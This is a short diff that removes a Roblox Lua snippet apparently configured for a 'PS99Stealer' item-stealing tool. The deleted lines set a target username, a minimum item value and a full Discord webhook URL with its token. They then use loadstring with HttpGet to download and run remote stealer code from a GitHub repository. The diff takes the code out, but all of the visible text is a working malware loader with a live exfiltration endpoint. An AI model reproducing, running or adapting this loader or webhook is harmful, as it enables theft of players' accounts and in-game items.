@@ -1,6 +1,0 @@
-Username = "DaBird_Bedwars"
-Username2 = "DaBird_Bedwars"
-MinimumRAP = 100000
-Webhook = "https://discord.com/api/webhooks/1359461379152678984/sI_yfYnTSRuCZuZehPgdfSHOHHjf30ZDOzRizZzRvDbupQ5lIgKgMWrqaGN5Vazzchjy"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/TraxMain/TraxStealer/refs/heads/main/PS99Stealer", true))()
